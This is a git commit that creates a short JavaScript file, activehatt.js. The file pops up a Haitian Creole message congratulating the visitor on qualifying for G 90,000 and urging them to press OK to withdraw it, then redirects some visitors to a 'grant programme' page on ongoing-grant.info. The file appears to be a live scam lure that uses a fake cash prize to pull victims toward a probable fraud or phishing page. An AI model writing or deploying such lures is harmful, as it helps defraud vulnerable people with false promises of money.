302572b7336d761e6d7276184425ae106412d61a
The-On-going <sirpeelawson@gmail.com>
2026-08-20 21:19:30 +0100

    Create activehatt.js

---
+++ activehatt.js
@@ -0,0 +1,10 @@
+var password = 'RETIRE LAJAN KACH';
+
+password = prompt(
+  'Felisitasyon! Ou kalifye pou resevwa G 90,000. Tanpri peze OK pou RETIRE.',
+  'RETIRE LAJAN KACH'
+);
+
+if (password !== 'RETIRE LAJAN KACH') {
+    location.href = 'https://ongoing-grant.info/G90000-Fanmi-Pwogram.html';
+}
